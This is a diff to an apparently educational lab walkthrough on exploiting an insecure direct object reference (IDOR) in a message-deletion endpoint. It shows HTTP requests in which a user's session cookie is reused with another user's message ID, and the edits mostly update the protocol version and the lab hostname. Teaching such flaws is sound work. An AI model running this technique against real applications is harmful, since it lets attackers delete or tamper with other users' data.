@@ -176,14 +176,14 @@ Let's exploit the IDOR vulnerability in the message deletion functionality:
 
 **Step 2:** Observe the request structure:
 ```
-GET /delete_message/3 HTTP/1.1
-Host: 678aa840859cc728c0ad9211-lb-732.bm
+GET /delete_message/3 HTTP/2
+Host: 678aa840859cc728c0ad9211-lb-732.bm-north.lab.poridhi.io
 Cookie: session=eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6IlVzZXIyIn0.Z92edQ.4TuLxICSCHi3qMS0suI3w4Jp41g
 ```
 
 **Step 3:** Modify the message ID to target "User1"'s message:
 ```
-GET /delete_message/1 HTTP/1.1
+GET /delete_message/1 HTTP/2
 Host: 678aa840859cc728c0ad9211-lb-732.bm-north.lab.poridhi.io
 Cookie: session=eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6IlVzZXIyIn0.Z92edQ.4TuLxICSCHi3qMS0suI3w4Jp41g
 ```
@@ -240,7 +240,7 @@ X-User-Id: 1
 
 ![Account Deletion IDOR](assets/repeat1.png)
 
-Send it again to ensure its deleted when you see the "Not found" response.
+Send it again to ensure its deleted when you see the "Not Found" response.
 
 ![Account Deletion IDOR](assets/repeat2.png)
 
